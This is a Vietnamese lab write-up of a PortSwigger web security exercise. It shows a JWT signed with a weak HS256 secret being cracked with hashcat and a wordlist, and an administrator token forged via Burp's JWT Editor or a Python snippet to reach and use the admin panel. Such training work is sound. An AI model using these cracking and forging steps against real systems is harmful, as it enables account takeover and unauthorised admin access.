![[jwt-weak.png]]
-mô tả lab: cookie `session` là JWT ký HS256 bằng secret rất yếu. Mình brute secret rồi tự ký token admin.

> [!NOTE]
> -test bằng `wiener:peter`. Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

### hướng giải
- [ ] mình login `wiener:peter`, sau đó quan sát cookie này, mình thấy `session=eyJra...` có 2 dấu chấm -> đúng format JWT
- [ ] mình paste vào JWT Editor, mình thấy header `{"kid":"hmac-key-1","alg":"HS256"}`, payload `{"iss":"...","sub":"wiener","exp":...}`
- [ ] => secret yếu thì brute được. Mình brute ra secret rồi sửa `sub` thành `administrator` + ký lại là vào admin

### giải
-bước 1: mình copy JWT vào file `jwt.txt`, brute bằng hashcat:
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
# hoặc: hashcat -m 16500 jwt.txt rockyou.txt
```
-sau khi quan sát kết quả này, mình thấy nó nhả ra secret, vd `secret1`.
![[jwt-weak-hashcat.png]]

-bước 2: mình mở JWT trong JWT Editor Keys, sửa payload:
```json
{"iss":"portswigger","sub":"administrator","exp":9999999999}
```
-rồi chọn HS256 + nhập secret vừa brute được, bấm Sign. Extension tự tạo token mới.
![[jwt-weak-sign.png]]

-bước 3: mình thay cookie `session` bằng token mới rồi GET:
```
GET /admin HTTP/1.1
Cookie: session=TOKEN_MOI_CUA_MINH
-> 200 admin panel
GET /admin/delete?username=carlos -> 302
```
-> là solve lab.

-cách tay không cần extension (mình hay dùng python khi lười mở Burp):
```python
import jwt
token = jwt.encode({"iss":"portswigger","sub":"administrator","exp":9999999999}, "secret1", algorithm="HS256", headers={"kid":"hmac-key-1"})
print(token)
```

> [!NOTE]
> -bài học của mình: secret JWT mà nằm trong rockyou thì coi như không ký. Secret phải dài random 256 bit. Thấy JWT HS256 là mình nghĩ ngay tới brute secret đầu tiên.
